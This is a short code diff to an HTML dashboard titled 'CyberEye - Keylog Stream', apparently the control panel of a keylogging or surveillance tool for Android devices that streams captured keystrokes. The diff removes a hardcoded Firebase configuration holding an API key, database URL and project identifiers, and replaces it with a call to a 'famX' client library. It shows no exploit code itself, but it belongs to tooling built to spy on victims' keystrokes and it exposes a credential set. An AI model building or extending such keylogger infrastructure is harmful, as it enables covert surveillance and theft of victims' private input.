@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CyberEye - Keylog Stream</title>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-    <script src="/static/firebase-mock.js"></script>
+    <script src="/static/famx-client.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
     <style>
@@ -287,15 +287,7 @@
     </div>
 
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
-            databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
-            projectId: "cyber-eye-ccb1e",
-            storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
-            appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const db = famX.database();
 
         let activeID = "";
         let logStore = [];
